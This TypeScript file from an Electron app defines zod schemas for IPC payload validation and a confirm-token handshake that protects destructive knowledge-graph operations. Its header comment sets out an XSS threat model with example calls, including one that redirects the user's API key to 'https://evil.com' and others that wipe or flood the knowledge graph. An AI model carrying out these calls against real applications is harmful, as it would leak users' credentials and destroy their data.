/**
 * SEC-16 / SEC-17 / BUG_REPORT C4
 *
 * IPC payload schema 集中定义 + 主进程二次握手。
 *
 * 背景：
 *   - electron/ipc-handlers.ts 有 92+ ipcMain.handle，历史上 0 处做 payload 校验，
 *     直接 `(_event, payload) => kg.xxx(payload.field)` 解构。
 *   - 一旦 renderer 被 XSS（content-script 加载用户复制粘贴的 HTML、第三方依赖被
 *     供应链投毒等），攻击者可经 contextBridge 直接调用任意 channel 注入参数：
 *       window.ovo.kgClear()                     -> 一键清空知识图谱
 *       window.ovo.privacySetBlacklist([...50k]) -> DoS preferences-store
 *       window.ovo.agentSetApiConfig({           -> 把用户的 API key 重定向
 *         baseUrl: "https://evil.com",            到攻击者域名（baseUrl 已有
 *         key: "...", model: "..."                白名单，但写在 handler 内联）
 *       })
 *       window.ovo.loggerBusiness({              -> 投毒 KG，写 1GB 字符串
 *         node: "x".repeat(1e9), ...
 *       })
 *
 * 方案：
 *   1. 用 zod 把高危 channel 的 payload schema 抽到本文件统一管理；
 *   2. 在 ipc-handlers.ts 提供 safeHandle(channel, schema, fn)，parse 失败
 *      直接返回 { ok: false, error } 并写 errorLogger.alert("warn")，不进入业务逻辑；
 *   3. 对最致命的破坏性 channel（kg:clear / kg:export）追加「主进程二次握手」：
 *      第一次调用返回 { confirmToken, expiresInMs }，
 *      10 秒内带 token 再次调用才真正执行；
 *      防止 XSS 一次性触发不可逆操作。
 *
 * 覆盖范围：13 个高危 channel（不是全部 92 个）。详见各 export schema 注释。
 */

import { z } from "zod";
import { randomBytes } from "node:crypto";
import { ACTION_TYPES, type ActionType } from "./types.js";

// ---------------------------------------------------------------
// 公共子 schema
// ---------------------------------------------------------------

/** 普通短字符串（应用名等）：1..200 char，禁 ASCII control char。
 *  用 char-code 比对而非正则字面量，避免源码里嵌真实控制字符。 */
const ShortString = z
  .string()
  .min(1)
  .max(200)
  .refine(
    (s) => {
      for (let i = 0; i < s.length; i++) {
        const c = s.charCodeAt(i);
        if (c < 0x20 || c === 0x7f) return false;
      }
      return true;
    },
    { message: "string contains control characters" }
  );

/** entity id：UUID 风格或短 hash，限定字符集 + 长度上限 */
const EntityId = z
  .string()
  .min(1)
  .max(128)
  .regex(/^[A-Za-z0-9_:.-]+$/, "entityId 仅允许 [A-Za-z0-9_:.-]");

/** 中等字符串：node / source 名等，1..500 */
const MidString = z.string().min(1).max(500);

/** 大型自由文本（log message / business node input snapshot）：上限 8KB
 *  避免 renderer 一次性投毒 1GB 字符串撑爆 SQLite。 */
const LargeText = z.string().max(8 * 1024);

// ---------------------------------------------------------------
// KG（知识图谱）- 4 个破坏性/外泄面 channel
// ---------------------------------------------------------------

/** kg:clear ——payload 为 { confirmToken? }（首次为空，确认时带 token）。
 *  二次握手由 ipc-handlers.ts 的 withConfirmHandshake 接管。 */
export const KgClearSchema = z
  .object({ confirmToken: z.string().min(8).max(128).optional() })
  .strict()
  .optional()
  .nullable();

/** kg:export ——同 kg:clear，需要二次握手才允许全量导出。 */
export const KgExportSchema = z
  .object({ confirmToken: z.string().min(8).max(128).optional() })
  .strict()
  .optional()
  .nullable();

/** kg:set-pinned ——置顶 / 取消置顶 entity。 */
export const KgSetPinnedSchema = z
  .object({
    entityId: EntityId,
    pinned: z.boolean()
  })
  .strict();

/** kg:delete-entity ——只接受单个 entityId 字符串。 */
export const KgDeleteEntitySchema = EntityId;

/** kg:delete-negative-pattern ——只接受 id 字符串。 */
export const KgDeleteNegativePatternSchema = EntityId;

// ---------------------------------------------------------------
// privacy
// ---------------------------------------------------------------

/** privacy:set-blacklist —— 应用黑名单。
 *  限制最多 200 个 app（用户手动维护场景实际不超过 50）+ 每个名字 200 char，
 *  防止 renderer 写入超大数组撑爆 preferences-store。 */
export const PrivacySetBlacklistSchema = z.array(ShortString).max(200);

/** privacy:pause —— 暂停截屏的分钟数。1..24*60。
 *  原 handler 内部还有 Math.max(1, Math.min) 兜底，但显式 schema 让 contract 清晰。 */
export const PrivacyPauseSchema = z.number().int().min(1).max(24 * 60);

// ---------------------------------------------------------------
// prefs
// ---------------------------------------------------------------

/** prefs:save-bootstrap —— 首启 wizard 三字段。
 *  interests / roles 数组最多 50 项 × 100 字符；currentProject 单行 200 字符。 */
export const PrefsSaveBootstrapSchema = z
  .object({
    interests: z.array(z.string().min(1).max(100)).max(50),
    currentProject: z.string().max(200),
    roles: z.array(z.string().min(1).max(100)).max(50)
  })
  .strict();

/** prefs:set-trust-level —— type 必须在 ACTION_TYPES 列表里，level 必须 0..4。 */
export const PrefsSetTrustLevelSchema = z
  .object({
    type: z.enum(ACTION_TYPES as [ActionType, ...ActionType[]]),
    level: z.union([z.literal(0), z.literal(1), z.literal(2), z.literal(3), z.literal(4)])
  })
  .strict();

/** prefs:set-retention-days —— 仅允许枚举值。 */
export const PrefsSetRetentionDaysSchema = z.union([
  z.literal(-1),
  z.literal(0),
  z.literal(7),
  z.literal(30),
  z.literal(90)
]);

/** prefs:set-redaction-level —— 仅允许三档。 */
export const PrefsSetRedactionLevelSchema = z.enum(["basic", "strict", "paranoid"]);

/** prefs:set-personality-overrides —— Record<string, 0..1>。
 *  键限定字符集（trait 名）+ 上限 100 个键，防 prototype 污染 / 内存膨胀。 */
export const PrefsSetPersonalityOverridesSchema = z
  .record(
    z.string().min(1).max(80).regex(/^[A-Za-z0-9_-]+$/, "trait 键仅允许 [A-Za-z0-9_-]"),
    z.number().min(0).max(1)
  )
  .refine((r) => Object.keys(r).length <= 100, { message: "personalityOverrides 最多 100 个键" });

// ---------------------------------------------------------------
// agent
// ---------------------------------------------------------------

/** agent:set-api-config —— API key 写入。
 *  - baseUrl 必须 https + 在白名单
 *  - key 必须前缀 sk- / sk_ / ghp_ / gho_ / xai- 等真实 LLM 服务商前缀
 *  - model 字符串 1..120
 *  注：原 handler 已校验 baseUrl 白名单，这里把 key 前缀也加上，
 *  防止 renderer 写入空串 / 任意字符串触发后续 fetch 暴露行为。 */
const ALLOWED_API_HOSTS = new Set([
  "api.anthropic.com",
  "api.openai.com",
  "api.deepseek.com",
  "openrouter.ai",
  "api.groq.com"
]);

const API_KEY_PREFIXES = ["sk-", "sk_", "ghp_", "gho_", "xai-", "gsk_", "or-"];

export const AgentSetApiConfigSchema = z
  .object({
    baseUrl: z
      .string()
      .min(1)
      .max(500)
      .refine(
        (s) => {
          try {
            const u = new URL(s);
            return u.protocol === "https:" && ALLOWED_API_HOSTS.has(u.host);
          } catch {
            return false;
          }
        },
        { message: "baseUrl 必须是 https + 白名单 host" }
      ),
    key: z
      .string()
      .min(10)
      .max(500)
      .refine((s) => API_KEY_PREFIXES.some((p) => s.startsWith(p)), {
        message: `key 必须以 ${API_KEY_PREFIXES.join(" / ")} 之一开头`
      }),
    model: z.string().min(1).max(120)
  })
  .strict();

// ---------------------------------------------------------------
// logger:business —— SEC-17 KG 投毒防护
// ---------------------------------------------------------------

/** logger:business —— renderer 直接往 KG 写 business log。
 *  历史上没有任何长度限制；XSS 后可一次性写 1GB 字符串撑爆 SQLite 文件。
 *  这里对所有字段加硬上限： */
export const LoggerBusinessSchema = z
  .object({
    pipelineId: z.string().max(128).optional(),
    node: MidString,
    status: z.enum(["pending", "running", "success", "failed", "skipped", "cancelled"]),
    /** input / output 是任意 JSON，superRefine 里限总字节数 */
    input: z.unknown().optional(),
    output: z.unknown().optional(),
    error: LargeText.optional(),
    meta: z.record(z.string().max(80), z.unknown()).optional()
  })
  .strict()
  .superRefine((val, ctx) => {
    // 防 KG 投毒：input/output/meta 序列化后总和不超过 64KB
    const totalBytes =
      (val.input !== undefined ? JSON.stringify(val.input).length : 0) +
      (val.output !== undefined ? JSON.stringify(val.output).length : 0) +
      (val.meta !== undefined ? JSON.stringify(val.meta).length : 0);
    if (totalBytes > 64 * 1024) {
      ctx.addIssue({
        code: "custom",
        message: `business log payload too large: ${totalBytes} bytes (max 65536)`
      });
    }
  });

// ---------------------------------------------------------------
// 主进程二次握手：confirm token 注册表
// ---------------------------------------------------------------

/**
 * 破坏性 channel 的两阶段执行：
 *   1. 第一次调用 schema parse 成功但 confirmToken === undefined -> 注册 token，
 *      返回 { ok: false, requiresConfirm: true, confirmToken, expiresInMs }
 *   2. 第二次调用带相同 confirmToken（10s 内）-> 删 token + 真正执行 fn
 *
 * 设计目的：renderer 被 XSS 后，攻击者要拿到 token 必须先发一次请求并解析
 * 返回值再回调；这把"一键清空"提高到"两步异步"，给 main 进程 ipc spam
 * 探测留出告警窗口（错误次数 > 阈值 -> 触发 errorLogger.alert("critical")）。
 */

interface PendingConfirm {
  channel: string;
  expiresAt: number;
}

const CONFIRM_TTL_MS = 10_000;
const confirmRegistry = new Map<string, PendingConfirm>();

/** GC（手动触发，避免再开 timer） */
function gcConfirmRegistry() {
  const now = Date.now();
  for (const [token, entry] of confirmRegistry) {
    if (entry.expiresAt < now) confirmRegistry.delete(token);
  }
}

export interface ConfirmHandshakeResult<T> {
  ok: boolean;
  /** 第一次调用：要求二次确认 */
  requiresConfirm?: true;
  confirmToken?: string;
  expiresInMs?: number;
  /** 第二次调用真正执行后的结果 */
  data?: T;
  error?: string;
}

/**
 * 包装一个 handler 使其需要二次确认。
 * payload 必须包含可选的 confirmToken 字段（schema 已统一为 { confirmToken?: string }）。
 */
export async function withConfirmHandshake<T>(
  channel: string,
  payload: { confirmToken?: string } | null | undefined,
  exec: () => T | Promise<T>
): Promise<ConfirmHandshakeResult<T>> {
  gcConfirmRegistry();
  const token = payload?.confirmToken;
  if (token) {
    const entry = confirmRegistry.get(token);
    if (!entry) {
      return { ok: false, error: "confirmToken 无效或已过期，请重新发起请求" };
    }
    if (entry.channel !== channel) {
      // token 不能跨 channel 复用
      confirmRegistry.delete(token);
      return { ok: false, error: "confirmToken 与 channel 不匹配" };
    }
    if (entry.expiresAt < Date.now()) {
      confirmRegistry.delete(token);
      return { ok: false, error: "confirmToken 已过期" };
    }
    confirmRegistry.delete(token);
    const data = await exec();
    return { ok: true, data };
  }
  // 第一次调用：注册 token
  const newToken = randomBytes(24).toString("base64url");
  confirmRegistry.set(newToken, {
    channel,
    expiresAt: Date.now() + CONFIRM_TTL_MS
  });
  return {
    ok: false,
    requiresConfirm: true,
    confirmToken: newToken,
    expiresInMs: CONFIRM_TTL_MS
  };
}

/** 测试 / 调试用，清空 token 表 */
export function _resetConfirmRegistryForTest() {
  confirmRegistry.clear();
}
